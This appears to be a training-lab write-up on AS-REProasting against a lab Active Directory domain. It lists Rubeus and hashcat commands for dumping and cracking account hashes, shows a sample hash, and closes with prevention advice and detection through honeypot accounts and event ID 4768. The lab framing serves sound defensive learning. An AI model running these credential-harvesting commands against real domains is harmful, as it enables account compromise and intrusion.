# AS-REProasting Lab

## Objective

Perform a AS-REProasting attack on the Windows 10 machine and obtain crackable hashes, find the user account 'svc-iam' then crack password on Kali Linux.
Connect to DC1 and investigate Event Manager to find the attack. 

## What is Kerberoasting

The AS-REProasting attack is similar to the Kerberoasting attack; we can obtain crackable hashes for user accounts that have the property Do not require Kerberos preauthentication enabled. The success of this attack depends on the strength of the user account password that we will crack.

## Skills Learned
- Run a AS-REProasting attack
- Filtering the Windows Event Viewer logs
- Cracking spn.txt files with Hashcat

## Tools Used
- Windows Event Log
- Hashcat
- Rubeus
- Kali Linux

## Steps

First we need to RDP over to our WIN10 machine and perform the AS-REProasting attack. I will be using Rubeus for this attack.

```
xfreerdp /u:(username) /p:(password) /v:(Machine IP) /dynamic-resolution
xfreerdp /u:(username) /p:(password) /v:(Machine IP) /dynamic-resolution /drive:share,/home/XXXXXXX
```

Next we need to open up a command prompt and CD to our downloads folder where the file we need to run in located.

```
cd C:\Users\bob\Downloads
```

```
.\Rubeus.exe asreproast /outfile:asrep.txt
```
![image](https://github.com/Matt4llan/Attack-Defense/assets/156334555/97415255-a4d8-4b43-b6ed-4fd0857a0fae)

![image](https://github.com/Matt4llan/Attack-Defense/assets/156334555/f99d943e-91bd-447b-8f93-347f72ebe310)

Now we have our file to crack we need to get this file back over to our Kali box. 

For hashcat to be able to recognize the hash, we need to edit it by adding 23$ after $krb5asrep$ we can edit the file usim Vim on the kali command line. 

```
$krb5asrep$23$anni@eagle.local:1b912b858c4551c0013dbe81ff0f01d7$c64803358a43d05383e9e01374e8f2b2c92f9
```

![image](https://github.com/Matt4llan/Attack-Defense/assets/156334555/962602f8-05a3-455e-b311-ea4664341b78)

We can now run this file trough hashcat

```
sudo hashcat -m 18200 -a 0 asrep.txt /usr/share/wordlists/rockyou.txt --outfile asrepcrack.txt --force
```

![image](https://github.com/Matt4llan/Attack-Defense/assets/156334555/465e6765-7ec9-4287-8cc7-d2c897dc1225)

Once hashcat cracks the password, we can print the contents of the output file to obtain the cleartext password

```
sudo cat asrepcrack.txt
```

![image](https://github.com/Matt4llan/Attack-Defense/assets/156334555/f611dd48-cad7-4cae-9ec0-f8810a76f226)


## Prevention

The success of attacks on users with "Do not require Kerberos preauthentication" depends on password strength. This property should be used only when necessary, and accounts should be reviewed quarterly to ensure it isn't improperly assigned. Regular user accounts with this property often have weaker passwords, making them easier targets than service accounts with SPNs. To protect these users, a separate password policy requiring at least 20 characters should be enforced to prevent cracking attempts.

## Detection

### HoneyPot

A honeypot user is an effective detection tool in AD environments, as any login attempts for this unused account are likely malicious and warrant inspection. However, if it's the only account with "Kerberos Pre-Authentication not required," advanced threat actors might identify it as a honeypot and avoid it. To create an effective honeypot user, ensure the account is old and appears unused, with service account passwords ideally over two years old and regular user passwords less than one year old. The account should have logins after the password change and possess some privileges to make it an attractive target for attackers.

### Investigate

When we executed Rubeus, an Event with ID 4768 was generated, signaling that a Kerberos Authentication ticket was generated

![image](https://github.com/Matt4llan/Attack-Defense/assets/156334555/6a25dc6c-c2b1-421e-9927-d9e29cda4283)

AD generates this event for every Kerberos authentication, resulting in a high volume of logs. However, the source of authentication can be tracked, allowing correlation of known good logins against potential malicious activities. While inspecting specific IP addresses can be challenging, especially if users move between office locations, scrutinizing the specific VLAN and alerting on any deviations can be effective.


